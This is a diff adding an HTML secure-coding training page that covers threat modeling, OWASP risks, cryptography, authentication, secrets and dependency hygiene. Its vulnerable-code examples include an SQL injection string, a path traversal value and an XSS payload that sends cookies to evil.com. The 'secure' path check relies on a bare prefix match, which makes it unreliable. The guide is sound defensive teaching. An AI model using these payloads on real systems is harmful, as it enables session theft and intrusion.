+        <p class="cd" data-lang="en">For every feature, interface, and data flow you build, ask: <strong>"How could this be misused?"</strong> Attackers don't follow the happy path — they explore edge cases, try unexpected inputs, and probe every boundary. You don't need to be a professional penetration tester; you need to habitually ask this question before writing code, not after.</p>
+        <p class="cd" data-lang="nl">Voor elke functie, interface en datastroom die je bouwt, vraag je: <strong>"Hoe kan dit misbruikt worden?"</strong> Aanvallers volgen niet het gelukkige pad — ze verkennen randgevallen, proberen onverwachte input en tasten elke grens af. Je hoeft geen professionele pentester te zijn; je moet deze vraag gewoontegetrouw stellen voordat je code schrijft, niet erna.</p>
+        <div class="codeblock">
+          <div class="cb-bar"><span class="cb-title">Abuse Case Examples</span></div>
+          <pre><span class="m">Feature: "Upload a profile photo"
+Functional thinking:</span>
+<span class="b">  → does it accept JPG/PNG? ✓
+  → does the preview look right? ✓</span>
+
+<span class="m">Security (adversarial) thinking:</span>
+<span class="r">  → what if I upload a .php file?
+  → what if the image is 4 GB?
+  → what if EXIF data contains a script?
+  → what if filename is "../../../etc/passwd"?
+  → what if I upload 10,000 files in parallel?</span>
+
+<span class="g">Each question → a security requirement</span></pre>
+        </div>
+      </div>
+      <div class="kp">
+        <div class="kp-title">How to develop this habit</div>
+        <div class="kp-items">
+          <div class="kp-item">For every input: <strong>what's the worst-case payload?</strong></div>
+          <div class="kp-item">For every access: <strong>what if a low-priv user requests this?</strong></div>
+          <div class="kp-item">Study real CVEs — ask "could my code have this bug?"</div>
+          <div class="kp-item">Use <strong>STRIDE</strong> as a mental checklist on every feature</div>
+          <div class="kp-item">Practice by attacking OWASP Juice Shop (a safe, vulnerable app)</div>
+        </div>
+      </div>
+      <div class="res">
+        <div class="res-label">Practice environment</div>
+        <a class="rl" href="https://owasp.org/www-project-juice-shop/" target="_blank"><span class="ri">🧃</span><span class="rt">OWASP Juice Shop — attack a real vulnerable app safely</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://portswigger.net/web-security" target="_blank"><span class="ri">🕷️</span><span class="rt">PortSwigger Web Security Academy — free, hands-on labs</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-mind">
+      <div class="ct">
+        <div class="ch"><div class="ci">🔍</div><div><div class="cn">Challenge Your Assumptions</div><div class="cs">Trust boundaries · Explicit assumptions · Assume breach</div></div></div>
+        <p class="cd">Every system is built on assumptions. <strong>Secure developers make those assumptions explicit — then challenge them.</strong> Attackers succeed by exploiting assumptions that turned out to be false. "We assumed authenticated users are trustworthy." "We assumed the internal network is safe." Violated assumptions are the anatomy of most breaches.</p>
+        <div class="codeblock">
+          <div class="cb-bar"><span class="cb-bad">Dangerous Hidden Assumptions</span></div>
+          <pre><span class="r">✗</span> "Authenticated users have good intent"
+<span class="r">✗</span> "The corporate network is trusted"
+<span class="r">✗</span> "Our open-source dependencies are clean"
+<span class="r">✗</span> "Our cloud provider handles our security"
+<span class="r">✗</span> "Nobody will find that hidden admin endpoint"
+<span class="r">✗</span> "Our own admins won't be compromised"
+<span class="r">✗</span> "The user's browser sends the right data"
+
+<span class="g">Assume breach: design as if attackers
+are already inside — because they may be.</span></pre>
+        </div>
+      </div>
+      <div class="kp">
+        <div class="kp-title">The Two Questions</div>
+        <div class="kp-items">
+          <div class="kp-item"><strong>Is this assumption still valid</strong> given today's threat landscape?</div>
+          <div class="kp-item"><strong>What happens</strong> to my system if this assumption is violated?</div>
+          <div class="kp-item">Document assumptions explicitly — they become your threat model</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card c-mind">
+      <div class="ct">
+        <div class="ch"><div class="ci">🛡️</div><div><div class="cn">You Own the Security of Your Code</div><div class="cs">Developer ownership · Shift Left · Shared responsibility</div></div></div>
+        <p class="cd">Security is not a gate at the end of the pipeline — it is not the security team's job alone, and it cannot be "added later." <strong>Every developer owns the security of the code they write.</strong> "Shift left" means catching security issues in your IDE, your design discussions, and your PR reviews — not six months later in a penetration test.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">1</div>Review your own PR for security before submitting it</div>
+        <div class="cki"><div class="dot">2</div>Raise security questions in requirements and design meetings</div>
+        <div class="cki"><div class="dot">3</div>Don't wait for the security team to find problems in your code</div>
+        <div class="cki"><div class="dot">4</div>Say "I don't know how to do this securely" — that is the right question</div>
+        <div class="cki"><div class="dot">5</div>Make security concerns visible in sprint planning — they deserve time</div>
+        <div class="cki"><div class="dot">6</div>Treat a security bug like any other bug: fix it, understand why it happened, prevent recurrence</div>
+      </div>
+      <div class="res">
+        <div class="res-label">Context</div>
+        <a class="rl" href="https://www.cisa.gov/securebydesign" target="_blank"><span class="ri">🏛️</span><span class="rt">CISA Secure by Design — Why developers own security</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-mind">
+      <div class="ct">
+        <div class="ch"><div class="ci">🔑</div><div><div class="cn">Never Roll Your Own Security</div><div class="cs">Kerckhoffs' principle · Use vetted primitives</div></div></div>
+        <p class="cd">Cryptography, authentication, and access control are <strong>extremely hard to get right</strong>. Don't implement your own — ever. The temptation to "just write a simple check" or "roll a quick hashing function" is how breaches happen. Use established, audited libraries and well-understood protocols.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">✗</div><strong>Never:</strong> MD5/SHA1 for passwords, homebrew session tokens, custom ciphers</div>
+        <div class="cki"><div class="dot">✓</div><strong>Passwords:</strong> Argon2id, bcrypt — via a library, not written from scratch</div>
+        <div class="cki"><div class="dot">✓</div><strong>Tokens:</strong> OS CSPRNG — secrets.token_bytes(), crypto.randomBytes()</div>
+        <div class="cki"><div class="dot">✓</div><strong>Auth:</strong> OAuth 2.0 + OIDC — don't write handcrafted token systems</div>
+        <div class="cki"><div class="dot">✓</div><strong>Queries:</strong> Parameterized / prepared statements — not string concatenation</div>
+        <div class="cki"><div class="dot">✓</div><strong>Crypto:</strong> libsodium, OpenSSL — not your own implementation</div>
+      </div>
+      <div class="res">
+        <div class="res-label">Principle</div>
+        <a class="rl" href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html" target="_blank"><span class="ri">📘</span><span class="rt">OWASP Cryptographic Storage Cheat Sheet</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="strip hot">
+    <span class="si">💡</span>
+    <div class="st"><strong>The core reframe:</strong> Stop asking only "does this work?" and start also asking "could this be abused?" Both questions matter equally. A feature that works perfectly but can be exploited is not a complete implementation — it is a vulnerability waiting to be found. Build both questions into your definition of done.</div>
+  </div>
+</div>
+
+
+<!-- ═══════════════════════════════════════════════ -->
+<!-- PANEL 2 — KNOWLEDGE                           -->
+<!-- ═══════════════════════════════════════════════ -->
+<div class="panel c-know" id="p1">
+  <div class="ph c-know" data-bg="KNOW">
+    <div class="ph-tag">02 · Core Knowledge</div>
+    <h2>What You Must Know</h2>
+    <p>You cannot defend against what you don't understand. A secure developer has <strong>working knowledge</strong> of the major vulnerability classes, how authentication and authorization really work, the applied cryptography choices that matter, and how to reason about threats systematically. This is not pen tester knowledge — it is the knowledge every developer needs to make sound daily decisions. Based on OWASP SAMM, CWE Top 25, and NIST SSDF requirements.</p>
+    <div class="ph-pills"><span class="ph-pill">OWASP Top 10</span><span class="ph-pill">CWE Top 25</span><span class="ph-pill">Applied crypto</span><span class="ph-pill">Auth & authz</span><span class="ph-pill">Threat modeling</span></div>
+  </div>
+
+  <div class="sec">Knowledge Maturity Matrix</div>
+  <table class="matrix">
+    <thead>
+      <tr><th>Knowledge Area</th><th><span class="l1c">Level 1 — Aware</span></th><th><span class="l2c">Level 2 — Practitioner</span></th><th><span class="l3c">Level 3 — Expert</span></th></tr>
+    </thead>
+    <tbody>
+      <tr><td>Injection (SQLi, XSS, CMDi, SSTI)</td><td class="l1c">Know why it happens; recognize patterns</td><td class="l2c">Write parameterized queries; encode all output by context</td><td class="l3c">Identify novel injection in code review; design framework-level defenses</td></tr>
+      <tr><td>Authentication &amp; Sessions</td><td class="l1c">Understand password hashing, JWTs, cookie flags</td><td class="l2c">Implement MFA, session invalidation, token rotation, OAuth 2.0</td><td class="l3c">Design full auth systems; audit OAuth flows; passkey implementation</td></tr>
+      <tr><td>Authorization / Access Control</td><td class="l1c">Understand RBAC; know OWASP A01; know what IDOR is</td><td class="l2c">Implement server-side checks; prevent IDOR; design RBAC models</td><td class="l3c">Design ABAC/ReBAC/Zanzibar-style systems; formal policy modeling</td></tr>
+      <tr><td>Applied Cryptography</td><td class="l1c">Hash vs encrypt; don't use MD5; know AES-GCM exists</td><td class="l2c">Choose Argon2id, AES-256-GCM, TLS 1.3 correctly; key storage patterns</td><td class="l3c">Evaluate crypto in architecture; plan post-quantum migration; HSM integration</td></tr>
+      <tr><td>Threat Modeling</td><td class="l1c">Know STRIDE; understand what a DFD is; know trust boundaries</td><td class="l2c">Facilitate STRIDE sessions for your own features; produce threat/mitigation list</td><td class="l3c">Run cross-team sessions; choose methodology per context; train others</td></tr>
+      <tr><td>Secure Design Patterns</td><td class="l1c">Know least privilege, fail secure, defense in depth</td><td class="l2c">Apply patterns in code and reviews; spot violations</td><td class="l3c">Evangelize patterns; embed in architecture decisions</td></tr>
+      <tr><td>Dependency &amp; Supply Chain</td><td class="l1c">Know what CVEs and SCA scanning are</td><td class="l2c">Audit deps; lock versions; generate SBOM; manage CVE alerts</td><td class="l3c">Design organizational supply chain integrity; SLSA, SBOM governance</td></tr>
+      <tr><td>Cloud &amp; Infrastructure Security</td><td class="l1c">Know IAM, security groups, least privilege in cloud</td><td class="l2c">Secure IaC (Terraform, k8s); policy-as-code; network segmentation</td><td class="l3c">Cloud security architecture; multi-account strategy; landing zones</td></tr>
+      <tr><td>Security Testing</td><td class="l1c">Know SAST, DAST, penetration testing exist and differ</td><td class="l2c">Run SAST in CI/CD; triage and fix findings; interpret DAST output</td><td class="l3c">Design testing strategy; threat-based testing; bug bounty program management</td></tr>
+    </tbody>
+  </table>
+
+  <div class="sec">Key Knowledge Areas — Deep Dive</div>
+  <div class="grid">
+
+    <div class="card c-know">
+      <div class="ct">
+        <div class="ch"><div class="ci">📋</div><div><div class="cn">OWASP Top 10 &amp; CWE Top 25</div><div class="cs">The required reading for every developer</div></div></div>
+        <div class="lv lv1">Level 1 — Must Know</div>
+        <p class="cd">The <strong>OWASP Top 10</strong> lists the most critical web application security risks, updated based on real breach data. The <strong>CWE Top 25</strong> covers the most dangerous code-level weaknesses. Every developer must understand all of these. Most real-world breaches trace back to fewer than 10 root causes.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">A01</div><strong>Broken Access Control</strong> — #1 for 3 years; check every endpoint server-side</div>
+        <div class="cki"><div class="dot">A02</div><strong>Cryptographic Failures</strong> — use strong hashing and encryption; never MD5</div>
+        <div class="cki"><div class="dot">A03</div><strong>Injection</strong> — parameterize all structured output (SQL, HTML, shell, template)</div>
+        <div class="cki"><div class="dot">A04</div><strong>Insecure Design</strong> — threat model; use secure design patterns from the start</div>
+        <div class="cki"><div class="dot">A05</div><strong>Security Misconfiguration</strong> — secure-by-default; disable debug in production</div>
+        <div class="cki"><div class="dot">A06</div><strong>Vulnerable Components</strong> — SCA scanning; patch strategy; lock dependencies</div>
+        <div class="cki"><div class="dot">A07</div><strong>Auth Failures</strong> — MFA, rate limiting, secure sessions, token management</div>
+        <div class="cki"><div class="dot">A08</div><strong>Software Integrity Failures</strong> — verify supply chain; sign artifacts</div>
+        <div class="cki"><div class="dot">A09</div><strong>Logging &amp; Monitoring Failures</strong> — log security events; separate write-only store</div>
+        <div class="cki"><div class="dot">A10</div><strong>SSRF</strong> — validate and restrict all outbound requests with allowlists</div>
+      </div>
+      <div class="res">
+        <div class="res-label">Sources</div>
+        <a class="rl" href="https://owasp.org/Top10/" target="_blank"><span class="ri">📘</span><span class="rt">OWASP Top 10 (2021) — official documentation</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://cwe.mitre.org/top25/archive/2024/2024_cwe_top25.html" target="_blank"><span class="ri">🎯</span><span class="rt">CWE Top 25 Most Dangerous Weaknesses (2024)</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-know">
+      <div class="ct">
+        <div class="ch"><div class="ci">🗺️</div><div><div class="cn">Threat Modeling</div><div class="cs">STRIDE · PASTA · Data Flow Diagrams</div></div></div>
+        <div class="lv lv2">Level 2 — Core Skill</div>
+        <p class="cd">Threat modeling is a <strong>structured way to think about what can go wrong before you write a single line of code</strong>. Draw a Data Flow Diagram, identify trust boundaries, apply STRIDE. The Microsoft SDL mandates it; NIST SSDF mandates it; Google, Amazon, and Netflix all practice it. It is the single highest-leverage security activity per hour invested.</p>
+        <div class="codeblock">
+          <div class="cb-bar"><span class="cb-title">STRIDE — one question per threat category</span></div>
+          <pre><span class="y">S</span>poofing        → Is the caller really who they claim?
+<span class="y">T</span>ampering       → Can data be altered in transit or at rest?
+<span class="y">R</span>epudiation     → Can actors deny their actions? (audit trail)
+<span class="y">I</span>nfo Disclosure → Can data leak to unauthorized parties?
+<span class="y">D</span>enial of Service → Can the system be made unavailable?
+<span class="y">E</span>levation of Privilege → Can a user gain more than intended?
+
+<span class="m">Apply to every element in your Data Flow Diagram:
+processes, data stores, data flows, trust boundaries</span></pre>
+        </div>
+      </div>
+      <div class="kp">
+        <div class="kp-title">4-Question Threat Model (start here)</div>
+        <div class="kp-items">
+          <div class="kp-item"><strong>What are we building?</strong> — draw the DFD, mark trust boundaries</div>
+          <div class="kp-item"><strong>What can go wrong?</strong> — apply STRIDE to each element</div>
+          <div class="kp-item"><strong>What do we do about it?</strong> — map mitigations; add to backlog</div>
+          <div class="kp-item"><strong>Did we do a good job?</strong> — review; revisit when the design changes</div>
+        </div>
+      </div>
+      <div class="res">
+        <div class="res-label">Tools</div>
+        <a class="rl" href="https://github.com/OWASP/threat-dragon" target="_blank"><span class="ri">🐉</span><span class="rt">OWASP Threat Dragon — free threat modeling tool</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling" target="_blank"><span class="ri">🌐</span><span class="rt">Microsoft Threat Modeling Tool (free)</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://owasp.org/www-community/Threat_Modeling" target="_blank"><span class="ri">📘</span><span class="rt">OWASP Threat Modeling Guide</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-know">
+      <div class="ct">
+        <div class="ch"><div class="ci">🔐</div><div><div class="cn">Authentication &amp; Authorization</div><div class="cs">Identity, sessions, OAuth 2.0, RBAC, IDOR</div></div></div>
+        <div class="lv lv2">Level 2 — Core Skill</div>
+        <p class="cd">These are the source of <strong>OWASP's #1 vulnerability class</strong> — Broken Access Control. You must understand how sessions work, what JWTs do and don't guarantee, how OAuth 2.0 flows work, why server-side checks are mandatory, and how object-level authorization (IDOR prevention) works.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">🔑</div><strong>Passwords:</strong> Argon2id (cost: 64MB memory, 3 iterations) — never MD5/SHA1</div>
+        <div class="cki"><div class="dot">🍪</div><strong>Sessions:</strong> server-side store; HttpOnly + Secure + SameSite=Lax cookies</div>
+        <div class="cki"><div class="dot">🏷️</div><strong>JWTs:</strong> validate signature + expiry + audience — never trust payload without verification</div>
+        <div class="cki"><div class="dot">🏛️</div><strong>OAuth 2.0:</strong> authorization code + PKCE flow; never implicit flow (deprecated)</div>
+        <div class="cki"><div class="dot">📱</div><strong>MFA:</strong> WebAuthn/passkeys first; TOTP second; avoid SMS where possible</div>
+        <div class="cki"><div class="dot">🚧</div><strong>IDOR:</strong> check that THIS user can access THIS object — not just "is this user authenticated"</div>
+        <div class="cki"><div class="dot">🔒</div><strong>Authz:</strong> server-side ALWAYS — hiding a button in the UI is not access control</div>
+      </div>
+      <div class="res">
+        <div class="res-label">Resources</div>
+        <a class="rl" href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" target="_blank"><span class="ri">📘</span><span class="rt">OWASP Authentication Cheat Sheet</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://passkeys.dev/" target="_blank"><span class="ri">🔑</span><span class="rt">Passkeys.dev — passwordless auth guide</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://jwt.io/introduction" target="_blank"><span class="ri">🏷️</span><span class="rt">JWT.io — introduction to JSON Web Tokens</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-know">
+      <div class="ct">
+        <div class="ch"><div class="ci">🔒</div><div><div class="cn">Applied Cryptography</div><div class="cs">Choosing and using — not implementing</div></div></div>
+        <div class="lv lv2">Level 2 — Core Skill</div>
+        <p class="cd">You don't need to understand elliptic curve math — but you <strong>must know which algorithm to use for each job</strong> and which to avoid. The wrong choice (MD5 for passwords, ECB mode, hardcoded key, Math.random() for tokens) is a critical vulnerability even when the implementation itself has zero bugs.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">H</div><strong>Hash data:</strong> SHA-256 / SHA-3 — <span style="color:#ef4444">never MD5 / SHA-1</span></div>
+        <div class="cki"><div class="dot">P</div><strong>Hash passwords:</strong> Argon2id — <span style="color:#ef4444">never bcrypt cost=4, never MD5</span></div>
+        <div class="cki"><div class="dot">E</div><strong>Symmetric encrypt:</strong> AES-256-GCM or ChaCha20-Poly1305 — <span style="color:#ef4444">never ECB mode</span></div>
+        <div class="cki"><div class="dot">T</div><strong>Transport:</strong> TLS 1.3 — <span style="color:#ef4444">disable TLS 1.0/1.1/SSLv3</span></div>
+        <div class="cki"><div class="dot">R</div><strong>Random:</strong> secrets.token_bytes(), crypto.randomBytes() — <span style="color:#ef4444">never Math.random()</span></div>
+        <div class="cki"><div class="dot">K</div><strong>Key storage:</strong> KMS / Vault / HSM — <span style="color:#ef4444">never hardcoded in source</span></div>
+      </div>
+      <div class="res">
+        <div class="res-label">Resources</div>
+        <a class="rl" href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html" target="_blank"><span class="ri">📘</span><span class="rt">OWASP Cryptographic Storage Cheat Sheet</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://www.crypto101.io/" target="_blank"><span class="ri">📖</span><span class="rt">Crypto 101 — free introductory cryptography book</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="toolbox c-know">
+    <h3>📚 Self-Study Resources (prioritized)</h3>
+    <div class="tool-row">
+      <a class="tp" href="https://portswigger.net/web-security" target="_blank">PortSwigger Web Security Academy (free)</a>
+      <a class="tp" href="https://owasp.org/Top10/" target="_blank">OWASP Top 10</a>
+      <a class="tp" href="https://cwe.mitre.org/top25/" target="_blank">CWE Top 25</a>
+      <a class="tp" href="https://textbook.cs161.org/" target="_blank">UC Berkeley CS161 Textbook (free)</a>
+      <a class="tp" href="https://www.hacksplaining.com/" target="_blank">Hacksplaining (interactive)</a>
+      <a class="tp" href="https://cheatsheetseries.owasp.org/" target="_blank">OWASP Cheat Sheet Series</a>
+      <a class="tp" href="https://tryhackme.com/" target="_blank">TryHackMe (labs)</a>
+      <a class="tp" href="https://pentesterlab.com/" target="_blank">PentesterLab (real CVE labs)</a>
+    </div>
+  </div>
+</div>
+
+
+<!-- ═══════════════════════════════════════════════ -->
+<!-- PANEL 3 — SECURE CODING                       -->
+<!-- ═══════════════════════════════════════════════ -->
+<div class="panel c-skill" id="p2">
+  <div class="ph c-skill" data-bg="CODE">
+    <div class="ph-tag">03 · Secure Coding Skills</div>
+    <h2>Hands-On Secure Coding Skills</h2>
+    <p>Knowledge is necessary but not sufficient. You must be able to <strong>write secure code in your actual technology stack, every day</strong>. This means making the right choices when handling input, building APIs, working with databases, managing secrets, storing data, and handling errors. These are skills learned by doing — not by reading about them.</p>
+    <div class="ph-pills"><span class="ph-pill">Input validation</span><span class="ph-pill">Output encoding</span><span class="ph-pill">API security</span><span class="ph-pill">Secrets</span><span class="ph-pill">Dependency hygiene</span><span class="ph-pill">Error handling</span></div>
+  </div>
+
+  <div class="sec">Core Coding Skills</div>
+  <div class="grid">
+
+    <div class="card c-skill">
+      <div class="ct">
+        <div class="ch"><div class="ci">🧪</div><div><div class="cn">Input Validation &amp; Output Encoding</div><div class="cs">Root cause of all injection attacks</div></div></div>
+        <div class="lv lv1">Must Have · Day 1</div>
+        <p class="cd">All injection attacks (SQL, XSS, command injection, path traversal, template injection) share one root cause: <strong>user-controlled data is treated as trusted instructions</strong>. The fix is always structural: separate data from code using the language's native mechanism.</p>
+        <div class="codeblock">
+          <div class="cb-bar"><span class="cb-bad">✗ Vulnerable</span></div>
+          <pre><span class="m"># SQL Injection</span>
+<span class="r">query = "SELECT * FROM users WHERE id='" + uid + "'"
+# → attacker sends: ' OR '1'='1
+
+# XSS — unsanitized output</span>
+<span class="r">res.write("&lt;h1&gt;Hello " + username + "&lt;/h1&gt;")
+# → attacker stored: &lt;script&gt;document.location='evil.com/steal?c='+document.cookie&lt;/script&gt;
+
+# Path Traversal</span>
+<span class="r">open("/files/" + user_filename)
+# → attacker sends: ../../etc/passwd</span></pre>
+        </div>
+        <div class="codeblock">
+          <div class="cb-bar"><span class="cb-good">✓ Secure</span></div>
+          <pre><span class="m"># SQL — parameterized query</span>
+<span class="g">cursor.execute("SELECT * FROM users WHERE id=?", [uid])</span>
+
+<span class="m"># XSS — context-aware output encoding</span>
+<span class="g">res.write("&lt;h1&gt;Hello " + html.escape(username) + "&lt;/h1&gt;")</span>
+
+<span class="m"># Path traversal — resolve + verify stays in root</span>
+<span class="g">p = Path("/files", user_filename).resolve()
+assert str(p).startswith("/files"), "Path traversal!"</span></pre>
+        </div>
+      </div>
+      <div class="kp">
+        <div class="kp-title">5-Stage Validation Process</div>
+        <div class="kp-items">
+          <div class="kp-item"><strong>Identify</strong> all input sources: URL, form, headers, cookies, files, env, DB, APIs</div>
+          <div class="kp-item"><strong>Canonicalize</strong> first — URL-decode, strip BOM, normalize Unicode NFC</div>
+          <div class="kp-item"><strong>Allowlist</strong> validate — regex, type, range, length (not blocklist)</div>
+          <div class="kp-item"><strong>Encode output</strong> for context — HTML, JS, CSS, URL, SQL all differ</div>
+          <div class="kp-item"><strong>Reject clearly</strong> on failure — never silently fix invalid input</div>
+        </div>
+      </div>
+      <div class="res">
+        <div class="res-label">Practice</div>
+        <a class="rl" href="https://portswigger.net/web-security/sql-injection" target="_blank"><span class="ri">🕷️</span><span class="rt">PortSwigger — SQL Injection labs (free)</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://portswigger.net/web-security/cross-site-scripting" target="_blank"><span class="ri">🕷️</span><span class="rt">PortSwigger — XSS labs (free)</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-skill">
+      <div class="ct">
+        <div class="ch"><div class="ci">🔑</div><div><div class="cn">Authentication &amp; Session Implementation</div><div class="cs">Secure auth in practice — not just theory</div></div></div>
+        <div class="lv lv2">Core Skill</div>
+        <p class="cd">Many breaches come from <strong>correct libraries used incorrectly</strong> — wrong cookie flags, missing token expiry, hardcoded secrets, or skipped rate limiting. Authentication implementation requires knowing not just what to use but precisely how to configure it.</p>
+        <div class="codeblock">
+          <div class="cb-bar"><span class="cb-title">Session Cookie — all flags required</span><span class="cb-lang">HTTP</span></div>
+          <pre>Set-Cookie: session=abc123;
+  <span class="g">HttpOnly</span>;      <span class="m">← JS cannot read (XSS protection)</span>
+  <span class="g">Secure</span>;        <span class="m">← only sent over HTTPS</span>
+  <span class="g">SameSite=Lax</span>; <span class="m">← CSRF protection</span>
+  <span class="g">Path=/</span>;
+  <span class="g">Max-Age=3600</span>  <span class="m">← expire in 1 hour</span></pre>
+        </div>
+      </div>
+      <div class="kp">
+        <div class="kp-title">Authentication Implementation Checklist</div>
+        <div class="kp-items">
+          <div class="kp-item">Hash passwords with Argon2id (memory: 64MB, iterations: 3, parallelism: 1)</div>
+          <div class="kp-item">Rate-limit login: max 5 attempts / 15 min per IP + username combination</div>
+          <div class="kp-item">Return generic errors — <strong>never</strong> distinguish "user not found" vs "wrong password"</div>
+          <div class="kp-item">Invalidate session on logout AND on password change</div>
+          <div class="kp-item">Step-up auth — re-authenticate before sensitive operations (delete account, change email)</div>
+          <div class="kp-item">Rotate tokens periodically and on privilege change</div>
+        </div>
+      </div>
+      <div class="res">
+        <div class="res-label">Reference</div>
+        <a class="rl" href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" target="_blank"><span class="ri">📘</span><span class="rt">OWASP Session Management Cheat Sheet</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-skill">
+      <div class="ct">
+        <div class="ch"><div class="ci">🌐</div><div><div class="cn">Secure API Design &amp; Implementation</div><div class="cs">OWASP API Security Top 10</div></div></div>
+        <div class="lv lv2">Core Skill</div>
+        <p class="cd">APIs are the primary attack surface of modern applications. Every endpoint must be designed with security in mind: authentication, authorization, rate limiting, input validation, and response shielding. The OWASP API Security Top 10 covers the most common API-specific failures.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">1</div><strong>Authenticate every request</strong> — no unauthenticated endpoints unless intentionally public</div>
+        <div class="cki"><div class="dot">2</div><strong>Authorize every operation</strong> — check THIS user can access THIS resource (IDOR prevention)</div>
+        <div class="cki"><div class="dot">3</div><strong>Rate limit all endpoints</strong> — especially auth, OTP, password reset, expensive operations</div>
+        <div class="cki"><div class="dot">4</div><strong>Validate input schema</strong> — use OpenAPI validation middleware; reject unknown fields</div>
+        <div class="cki"><div class="dot">5</div><strong>Limit response data</strong> — return only fields the caller needs and is authorized to see</div>
+        <div class="cki"><div class="dot">6</div><strong>HTTPS everywhere</strong> — HSTS header; reject plaintext HTTP</div>
+        <div class="cki"><div class="dot">7</div><strong>Security headers</strong> — CSP, CORS policy, X-Frame-Options, X-Content-Type-Options</div>
+        <div class="cki"><div class="dot">8</div><strong>No sensitive data in URLs</strong> — tokens, keys, passwords must not appear in query strings or paths</div>
+      </div>
+      <div class="res">
+        <div class="res-label">Reference</div>
+        <a class="rl" href="https://owasp.org/API-Security/" target="_blank"><span class="ri">📘</span><span class="rt">OWASP API Security Top 10</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-skill">
+      <div class="ct">
+        <div class="ch"><div class="ci">🗝️</div><div><div class="cn">Secrets Management</div><div class="cs">No secrets in source code — ever</div></div></div>
+        <div class="lv lv1">Must Have · Day 1</div>
+        <p class="cd">One of the most common and most preventable breach vectors: <strong>API keys, passwords, and certificates committed to version control</strong>. Attackers continuously scan GitHub, GitLab, and npm for exposed secrets. Once committed, a secret is compromised — even if deleted from history (it lives in other clones, forks, and backups).</p>
+        <div class="codeblock">
+          <div class="cb-bar"><span class="cb-bad">✗ Never — secrets in code</span></div>
+          <pre><span class="r">DB_PASSWORD = "supersecret123"    # hardcoded
+API_KEY     = "sk-proj-abc..."    # in config file
+aws_secret  = "AKIAIOSFODNN7..." # in .env committed to git</span></pre>
+        </div>
+        <div class="codeblock">
+          <div class="cb-bar"><span class="cb-good">✓ Correct — runtime injection from secure store</span></div>
+          <pre><span class="g">import os
+db_pass = os.getenv("DB_PASSWORD")  # from Vault/KMS
+
+# .gitignore must include .env before first commit
+# Use pre-commit hook: gitleaks detect
+
+# Short-lived credentials (AWS)
+sts.assume_role(RoleArn=..., DurationSeconds=900)</span></pre>
+        </div>
+      </div>
+      <div class="kp">
+        <div class="kp-title">Secrets Management Strategy</div>
+        <div class="kp-items">
+          <div class="kp-item">Add <code>.env</code> to <code>.gitignore</code> before the first commit — not after</div>
+          <div class="kp-item">Install pre-commit hook: gitleaks detect on every developer machine</div>
+          <div class="kp-item">Use a secrets manager: Vault, AWS Secrets Manager, Azure Key Vault, Doppler</div>
+          <div class="kp-item">Prefer <strong>short-lived credentials</strong> (JIT access) over long-lived API keys</div>
+          <div class="kp-item">Rotate immediately on any suspected exposure — don't wait to confirm</div>
+        </div>
+      </div>
+      <div class="res">
+        <div class="res-label">Tools</div>
+        <a class="rl" href="https://github.com/gitleaks/gitleaks" target="_blank"><span class="ri">🔍</span><span class="rt">gitleaks — detect secrets in git repositories</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://developer.hashicorp.com/vault" target="_blank"><span class="ri">🔐</span><span class="rt">HashiCorp Vault — secrets management platform</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-skill">
+      <div class="ct">
+        <div class="ch"><div class="ci">📦</div><div><div class="cn">Dependency &amp; Supply Chain Security</div><div class="cs">SCA · SBOM · CVE management</div></div></div>
+        <div class="lv lv2">Core Skill</div>
+        <p class="cd">The majority of modern application code is third-party. <strong>One vulnerable dependency can compromise an otherwise perfectly written application.</strong> Log4Shell, Heartbleed, XZ Utils — all were dependency attacks. Knowing what you include and whether it's safe is as important as securing your own code.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">🔒</div><strong>Lock versions:</strong> use package-lock.json / poetry.lock / go.sum — never loose version ranges in production</div>
+        <div class="cki"><div class="dot">🔍</div><strong>SCA scan in CI/CD:</strong> npm audit, pip-audit, trivy fs — on every build</div>
+        <div class="cki"><div class="dot">🤖</div><strong>Dependabot / Renovate:</strong> automated PRs for CVE fixes and updates</div>
+        <div class="cki"><div class="dot">📋</div><strong>Generate SBOM:</strong> syft or CycloneDX — know every component in your artifact</div>
+        <div class="cki"><div class="dot">🧐</div><strong>Evaluate before adding:</strong> maintenance status, known issues, download counts, license</div>
+        <div class="cki"><div class="dot">🚨</div><strong>CVE SLA:</strong> CRITICAL = fix in 24h; HIGH = 7 days; MEDIUM = next sprint</div>
+      </div>
+      <div class="res">
+        <div class="res-label">Tools</div>
